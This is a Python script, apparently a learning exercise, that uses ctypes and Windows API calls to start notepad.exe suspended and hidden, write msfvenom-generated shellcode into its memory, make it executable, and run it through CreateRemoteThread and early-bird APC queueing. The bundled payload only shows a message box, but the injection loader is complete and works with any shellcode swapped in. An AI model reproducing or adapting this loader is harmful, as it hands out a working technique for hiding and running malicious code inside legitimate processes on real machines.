from ctypes import *
from ctypes import wintypes
import subprocess

kernel32 = windll.kernel32
SIZE_T = c_size_t
LPSTR = POINTER(c_char)
LPBYTE = POINTER(c_ubyte)


VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID ,SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID # base address of allocated region = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL # 0 or !0

# create new structure to point to for 2nd arg in CreateRemoteThread
class _SECURITY_ATTRIBUTES(Structure):
	_fields_ = [("nLength", wintypes.DWORD),
				  ("lpSecurityDescriptor", wintypes.LPVOID),
				  ("bInheritHandle", wintypes.BOOL)]

class STARTUPINFO(Structure):
	_fields_ = [("cb", wintypes.DWORD),
				("lpReserved", LPSTR),
				("lpDesktop", LPSTR),
				("lpTitle", LPSTR),
				("dwX", wintypes.DWORD),
				("dwY", wintypes.DWORD),
				("dwXSize", wintypes.DWORD),
				("dwYSize", wintypes.DWORD),
				("dwXCountChars", wintypes.DWORD),
				("dwYCountChars", wintypes.DWORD),
				("dwFillAttribute", wintypes.DWORD),
				("dwFlags", wintypes.DWORD),
				("wShowWindow", wintypes.WORD),
				("cbReserved2", wintypes.WORD),
				("lpReserved2", LPBYTE),
				("hStdInput", wintypes.HANDLE),
				("hStdOutput", wintypes.HANDLE),
				("hStdError", wintypes.HANDLE),]

class PROCESS_INFORMATION(Structure):
	_fields_ = [("hProcess", wintypes.HANDLE),
				("hThread", wintypes.HANDLE),
				("dwProcessId", wintypes.DWORD),
				("dwThreadId", wintypes.DWORD),]


SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READ_WRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

VirtualProtectEx = kernel32.VirtualProtectEx
VirtualProtectEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.LPDWORD)
VirtualProtectEx.restype = wintypes.BOOL

# create process API call setup
CreateProcessA = kernel32.CreateProcessA
CreateProcessA.argtypes = (wintypes.LPCSTR, wintypes.LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION))
CreateProcessA.restype = wintypes.BOOL

# create hello world shell code via kali vm and msfvenom
# msfvenom -a x64 -p windows/x64/messagebox TITLE=hello TEXT=world -f py
# Payload size: 297 bytes
# Final size of py file: 1474 bytes
buf =  b""
buf += b"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00"
buf += b"\x00\x41\x51\x41\x50\x52\x51\x48\x31\xd2\x65\x48"
buf += b"\x8b\x52\x60\x48\x8b\x52\x18\x56\x48\x8b\x52\x20"
buf += b"\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x8b\x72\x50"
buf += b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1"
buf += b"\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b"
buf += b"\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
buf += b"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00"
buf += b"\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b"
buf += b"\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x4d"
buf += b"\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6"
buf += b"\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38"
buf += b"\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75"
buf += b"\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
buf += b"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
buf += b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
buf += b"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff"
buf += b"\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff"
buf += b"\xff\x5d\xe8\x0b\x00\x00\x00\x75\x73\x65\x72\x33"
buf += b"\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c\x77\x26"
buf += b"\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x06"
buf += b"\x00\x00\x00\x77\x6f\x72\x6c\x64\x00\x5a\xe8\x06"
buf += b"\x00\x00\x00\x68\x65\x6c\x6c\x6f\x00\x41\x58\x48"
buf += b"\x31\xc9\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31"
buf += b"\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5"

def verify(x):
	if not x:
		raise WinError()

startup_info = STARTUPINFO()
startup_info.cb = sizeof(startup_info)

startup_info.dwFlags = 1
startup_info.wShowWindow = 1

process_info = PROCESS_INFORMATION()

CREATE_NEW_CONSOLE = 0x00000010
CREATE_NO_WINDOW = 0x08000000
CREATE_SUSPENDED = 0x00000004

created = CreateProcessA(b"C:\\Windows\\System32\\notepad.exe", None, None, None, False, CREATE_NO_WINDOW | CREATE_SUSPENDED, None, None, byref(startup_info), byref(process_info))

verify(created)

pid = process_info.dwProcessId
h_process = process_info.hProcess
thread_id = process_info.dwThreadId
h_thread = process_info.hThread

print("Started process => Handle: {}, PID: {}, TID: {}".format(h_process, pid, thread_id))

# allocate memory in process -> read write only.
remote_memory = VirtualAllocEx(h_process, False, len(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READ_WRITE)
verify(remote_memory)
print("Memory Allocated => ", hex(remote_memory))

write = WriteProcessMemory(h_process, remote_memory, buf, len(buf), None)
verify(write)
print("Bytes Written => {}".format(len(buf)))

PAGE_EXECUTE_READ = 0x20

old_protection = wintypes.DWORD(0)
memory_execute = VirtualProtectEx(h_process, remote_memory, len(buf), PAGE_EXECUTE_READ, old_protection)
verify(memory_execute)
print("Memory Protection updated from {} to {}".format(old_protection.value, PAGE_EXECUTE_READ))

rthread = CreateRemoteThread(h_process, None, 0, remote_memory, None, EXECUTE_IMMEDIATELY, None)
verify(rthread)

PAPCFUNC = CFUNCTYPE(None, POINTER(wintypes.ULONG))

QueueUserAPC = kernel32.QueueUserAPC
QueueUserAPC.argtypes = (PAPCFUNC, wintypes.HANDLE, POINTER(wintypes.ULONG))
QueueUserAPC.restype = wintypes.BOOL

ResumeThread = kernel32.ResumeThread
ResumeThread.argtypes = (wintypes.HANDLE, )
ResumeThread.restype = wintypes.BOOL

rqueue = QueueUserAPC(PAPCFUNC(remote_memory), h_thread, None)
verify(rqueue)
print("Queueing APC thead => {}".format(h_thread))

rthread = ResumeThread(h_thread)
verify(rthread)
print("Resuming Thread!")